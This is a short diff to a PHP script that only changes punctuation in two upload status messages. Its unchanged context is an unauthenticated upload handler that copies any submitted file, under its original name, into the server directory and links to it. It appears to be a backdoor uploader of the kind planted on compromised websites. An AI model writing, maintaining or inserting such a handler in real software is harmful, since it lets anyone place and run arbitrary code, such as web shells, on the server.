@@ -54,9 +54,9 @@ echo '<input type="file" name="file" size="0"><input name="_upl" type="submit" i
 if ($_POST['_upl'] == "Upload") {
     if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
         $uploaded = $_FILES['file']['name'];
-        echo "Upload Success <a style='font-size:18px; font-family:sans-serif;' target='_blank' href='$uploaded'>Click here to open your file</a>";
+        echo "Upload Success. <a style='font-size:18px; font-family:sans-serif;' target='_blank' href='$uploaded'>Click here to open your file</a>";
     } else {
-        echo 'upload failed!';
+        echo 'upload failed.';
     }
 } else {
     ;
